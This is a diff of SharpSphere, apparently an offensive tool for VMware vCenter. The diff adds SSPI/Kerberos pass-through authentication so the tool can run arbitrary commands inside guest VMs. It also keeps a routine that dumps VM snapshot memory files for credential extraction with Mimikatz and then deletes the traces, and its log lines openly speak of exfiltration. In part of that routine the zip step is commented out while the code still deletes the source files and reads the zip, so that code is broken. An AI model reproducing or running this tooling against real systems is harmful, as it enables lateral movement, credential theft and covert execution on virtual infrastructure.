@@ -12,8 +12,11 @@ namespace SharpSphere
     using NSspi;
     using NSspi.Contexts;
     using NSspi.Credentials;
-    using System.IO.Compression;
+    //using System.IO.Compression;
     using System.Net;
+    using System.ServiceModel;
+    using System.ServiceModel.Security;
+    using SharpSphere.Security;
 
     internal class Program
     {
@@ -21,8 +24,9 @@ namespace SharpSphere
         private static VimPortTypeClient vim;
         private static ManagedObjectReference vm;
         private static ServiceContent serviceContent;
-        private static NamePasswordAuthentication creds;
-        private static System.ServiceModel.BasicHttpsBinding binding;
+        private static GuestAuthentication creds;
+        private static System.ServiceModel.BasicHttpBinding binding;
+        //private static System.ServiceModel.Channels.Binding test;
         private static UserSession userSession = null;
         private static string datacenterName;
         static void Log(string a)
@@ -45,14 +49,18 @@ namespace SharpSphere
                 System.Net.ServicePointManager.ServerCertificateValidationCallback = ((sender, certificate, chain, sslPolicyErrors) => true);
 
                 //Create the vCenter API object
-                Log("[x] Creating vSphere API interface, takes a few minutes...");
-                binding = new System.ServiceModel.BasicHttpsBinding
+                Log("[x] Creating vSphere API interface");
+
+                binding = new System.ServiceModel.BasicHttpBinding
                 {
-                    AllowCookies = true
+                    AllowCookies = true,
 
                 };
-                binding.Security.Mode = System.ServiceModel.BasicHttpsSecurityMode.Transport;
-                ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
+
+                binding.Security.Mode = System.ServiceModel.BasicHttpSecurityMode.Transport;
+
+                ServicePointManager.SecurityProtocol = (SecurityProtocolType)(0xc0 | 0x300 | 0xc00);
+
                 var endpoint = new System.ServiceModel.EndpointAddress(url);
                 vim = new VimPortTypeClient(binding, endpoint);
                 var moref = new ManagedObjectReference
@@ -60,33 +68,26 @@ namespace SharpSphere
                     type = "ServiceInstance",
                     Value = "ServiceInstance",
                 };
-                
+
                 //Bind to vCenter
                 serviceContent = vim.RetrieveServiceContent(moref);
                 Log("[x] Connected to " + serviceContent.about.fullName);
-                
+
                 //Attempt login
-                if (username != null)
+                if (username != null && password != null)
                 {
                     //Login with username and password
+                    Log("[x] Authenticating with provided username and password");
                     userSession = vim.Login(serviceContent.sessionManager, username, password, null);
                 }
-                /*else
+                else
                 {
-                    //Login with SSPI
-                    byte[] rawToken = GetSSPIToken(PackageNames.Kerberos);
-                    string token = Convert.ToBase64String(rawToken);
-                    var token2 = System.Text.Encoding.Default.GetString(rawToken);
-                    try
-                    {
-                        vim.LoginBySSPI(serviceContent.sessionManager, token, null);
-                    }
-                    catch (Exception exception)
-                    {
-                        Console.Out.WriteLine(exception.ToString());
-                    }
-
-                }*/
+                    //SspiHelper from https://github.com/m1chaeldg/vSphereSdkSspiSample
+                    string host = new Uri(url).Host;
+                    string domain = Environment.UserDomainName;
+                    Log("[x] Authenticating with SSPI token of executing user");
+                    userSession = vim.LoginBySSPI(serviceContent.sessionManager, GetSspiToken("host/" + host + "@" + domain), null);
+                }
                 if (userSession is null)
                     Error(new Exception("Failed to authenticate."));
                 Log("[x] Successfully authenticated");
@@ -112,67 +113,18 @@ namespace SharpSphere
             }
         }
 
-        //WIP for SSO auth
-        /*private static byte[] GetSSPIToken(string packageName)
+        static string GetSspiToken(string principal)
         {
-            ClientCurrentCredential clientCred = null;
-            ClientContext client = null;
+            SspiHelper ch = new SspiHelper(principal);
+            byte[] ct = null;
+            byte[] st = null;
+            bool cc = true;
 
-            ServerCurrentCredential serverCred = null;
-            ServerContext server = null;
+            // Get the base64 token for the current Windows logon session.
+            ch.InitializeClient(out ct, st, out cc, SspiPackageType.Kerberos);
+            return Convert.ToBase64String(ct);
+        }
 
-            byte[] clientToken;
-            byte[] serverToken;
-
-            SecurityStatus clientStatus;
-
-            try
-            {
-                clientCred = new ClientCurrentCredential(packageName);
-                serverCred = new ServerCurrentCredential(packageName);
-
-                Console.Out.WriteLine(clientCred.PrincipleName);
-
-                client = new ClientContext(
-                    clientCred,
-                    serverCred.PrincipleName, ContextAttrib.Zero
-                );
-
-                server = new ServerContext(
-                    serverCred, ContextAttrib.Zero
-                );
-
-                clientToken = null;
-                serverToken = null;
-
-                clientStatus = client.Init(serverToken, out clientToken);
-
-
-            }
-            finally
-            {
-                if (server != null)
-                {
-                    server.Dispose();
-                }
-
-                if (client != null)
-                {
-                    client.Dispose();
-                }
-
-                if (clientCred != null)
-                {
-                    clientCred.Dispose();
-                }
-
-                if (serverCred != null)
-                {
-                    serverCred.Dispose();
-                }
-            }
-            return clientToken;
-        }*/
         static void ExecuteCommand(GuestAuthentication creds, string arguments, string programPath, string workingDirectory, bool output)
         {
             try
@@ -190,11 +142,11 @@ namespace SharpSphere
                 {
                     //Set file to receive output
                     var outfile = Path.GetRandomFileName();
-                    guestProgramSpec.arguments += @" > C:\Users\Public\" + outfile + @" 2>&1";
+                    guestProgramSpec.arguments += @" > "+ workingDirectory + "\\" + outfile + @" 2>&1";
 
                     //Start the program and receive the PID back
                     Log("[x] Attempting to run cmd with the following arguments: " + guestProgramSpec.arguments);
-                    Log(@"[x] Temporarily saving out to C:\Users\Public\" + outfile);
+                    Log(@"[x] Temporarily saving out to " + workingDirectory + "\\" + outfile);
                     long pid = vim.StartProgramInGuest(processManager, vm, creds, guestProgramSpec);
 
                     //Display PID
@@ -214,7 +166,7 @@ namespace SharpSphere
                         {
                             Log("[x] Execution finished, attempting to retrieve the results");
                             //Get the results
-                            var fileTransferInformation = vim.InitiateFileTransferFromGuest(guestFileManager, vm, creds, @"C:\Users\Public\" + outfile);
+                            var fileTransferInformation = vim.InitiateFileTransferFromGuest(guestFileManager, vm, creds, workingDirectory + "\\" + outfile);
                             using (var client = new System.Net.WebClient())
                             {
                                 client.CachePolicy = new HttpRequestCachePolicy(HttpRequestCacheLevel.NoCacheNoStore);
@@ -224,7 +176,7 @@ namespace SharpSphere
                             }
 
                             //Delete the file
-                            vim.DeleteFileInGuest(guestFileManager, vm, creds, @"C:\Users\Public\" + outfile);
+                            vim.DeleteFileInGuest(guestFileManager, vm, creds, workingDirectory + "\\" + outfile);
                             Log("[x] Output file deleted");
 
                             finished = true;
@@ -244,28 +196,28 @@ namespace SharpSphere
 
             }
             catch (Exception fault)
+            
             {
                 Error(fault);
             }
         }
 
-        static GuestAuthentication GuestAuth()
+        private static GuestAuthentication GuestAuth(string sspiToken)
         {
-            GuestAuthentication guestAuth = new GuestAuthentication()
+            SSPIAuthentication guestAuth = new SSPIAuthentication()
             {
-                interactiveSession = true,
+                sspiToken = sspiToken,
             };
             ManagedObjectReference guestAuthManager = GetProperty<ManagedObjectReference>(serviceContent.guestOperationsManager, "authManager");
             try
             {
-                vim.AcquireCredentialsInGuest(guestAuthManager, vm, guestAuth, 0);
+              return vim.AcquireCredentialsInGuest(guestAuthManager, vm, guestAuth);
+                
             }
             catch (Exception e)
             {
-                Console.WriteLine(e.Message);
+                Error(e);
             }
-
-
             return null;
         }
 
@@ -276,15 +228,26 @@ namespace SharpSphere
                 //Connect to target VM
                 Connect(options.url, options.username, options.password, options.ip);
 
-                GuestAuth();
+                
                 //Build credential object to authenticate to guest OS
-                creds = new NamePasswordAuthentication()
+                if (options.guestusername == null && options.guestpassword == null)
                 {
-                    username = options.guestusername,
-                    password = options.guestpassword,
-                    interactiveSession = true,
-                };
-                ExecuteCommand(creds, "/c " + options.command, @"C:\Windows\System32\cmd.exe", @"C:\Users\Public", options.output);
+                    Log("[x] Authenticating to guest using pass through authentication (SSPI)");
+                    string host = GetProperty<GuestInfo>(vm, "guest").hostName;
+                    string domain = Environment.UserDomainName;
+                    string principal = "host/" + host + "@" + domain;
+                    creds = GuestAuth(GetSspiToken(principal));
+                } else
+                {
+                    Log("[x] Authenticating to guest using provided username and password");
+                    creds = new NamePasswordAuthentication()
+                    {
+                        username = options.guestusername,
+                        password = options.guestpassword,
+                        interactiveSession = true,
+                    };
+                }
+                ExecuteCommand(creds, "/c " + options.command, @"C:\Windows\System32\cmd.exe", options.outputDir, options.output);
             }
             catch (Exception fault)
             {
@@ -306,7 +269,7 @@ namespace SharpSphere
 
                 foreach (var datacenter in datacenters)
                 {
-                    
+
                     var vmFolder = GetProperty<ManagedObjectReference>(datacenter, "vmFolder");
                     var datacenterVms = ScanForVms(vmFolder);
 
@@ -430,14 +393,14 @@ namespace SharpSphere
                 ManagedObjectReference snapshot = GetSnapshot(options.targetvm, options.snapshot);
 
                 //Get information about the snapshot
-                VirtualMachineFileInfo fileInfo = GetProperty<VirtualMachineConfigInfo>(snapshot, "config").files; 
+                VirtualMachineFileInfo fileInfo = GetProperty<VirtualMachineConfigInfo>(snapshot, "config").files;
 
                 //Build the objects we need
                 ManagedObjectReference environmentBrowser = GetProperty<ManagedObjectReference>(vm, "environmentBrowser");
                 ManagedObjectReference datastoreBrowser = GetProperty<ManagedObjectReference>(environmentBrowser, "datastoreBrowser");
 
                 //Search for a vmem file
-                ManagedObjectReference task = vim.SearchDatastore_Task(datastoreBrowser, fileInfo.snapshotDirectory, GetHostDatastoreBrowserSearchSpec()); 
+                ManagedObjectReference task = vim.SearchDatastore_Task(datastoreBrowser, fileInfo.snapshotDirectory, GetHostDatastoreBrowserSearchSpec());
                 TaskInfo info = GetProperty<TaskInfo>(task, "info");
                 string state = info.state.ToString();
                 while (state != "success")
@@ -467,7 +430,7 @@ namespace SharpSphere
                 //Grab the latest .vmem file if there is more than one associated with a VM                
                 foreach (FileInfo file in results.file)
                 {
-                    if ( latestFile == null || DateTime.Compare(file.modification, latestFile.modification) > 0)
+                    if (latestFile == null || DateTime.Compare(file.modification, latestFile.modification) > 0)
                     {
                         latestFile = file;
                     }
@@ -498,22 +461,22 @@ namespace SharpSphere
 
                 //Zip up the two downloaded files
                 Log("[x] Download complete, zipping up so it's easier to exfiltrate...");
-                var zip = ZipFile.Open(zipFile, ZipArchiveMode.Create);
+                /*var zip = ZipFile.Open(zipFile, ZipArchiveMode.Create);
                 zip.CreateEntryFromFile(vmemFile, Path.GetFileName(vmemFile), CompressionLevel.Optimal);
-                zip.CreateEntryFromFile(vmsnFile, Path.GetFileName(vmsnFile), CompressionLevel.Optimal);
-                zip.Dispose();
+                zip.CreateEntryFromFile(vmsnFile, Path.GetFileName(vmsnFile), CompressionLevel.Optimal);*/
+                //zip.Dispose();
                 File.Delete(vmemFile);
                 File.Delete(vmsnFile);
                 System.IO.FileInfo zipFileInfo = new System.IO.FileInfo(zipFile);
-                Log("[x] Zipping complete, download " + zipFile + " ("+ zipFileInfo.Length / 1048576 + "MB), rename to .zip, and follow instructions to use with Mimikatz");
+                Log("[x] Zipping complete, download " + zipFile + " (" + zipFileInfo.Length / 1048576 + "MB), rename to .zip, and follow instructions to use with Mimikatz");
 
                 //Delete the snapshot we created if needed
-                if(options.snapshot)
+                if (options.snapshot)
                 {
                     Log("[x] Deleting the snapshot we created");
                     vim.RemoveSnapshot_Task(snapshot, false, true);
                 }
-                
+
             }
             catch (Exception fault)
             {
@@ -599,7 +562,7 @@ namespace SharpSphere
 
 
 
-        static void UploadFile(NamePasswordAuthentication creds, string source, string destination)
+        static void UploadFile(GuestAuthentication creds, string source, string destination)
         {
             try
             {
@@ -639,7 +602,7 @@ namespace SharpSphere
             }
             return 0;
         }
-        static void DownloadFile(NamePasswordAuthentication creds, string source, string destination)
+        static void DownloadFile(GuestAuthentication creds, string source, string destination)
         {
             try
             {
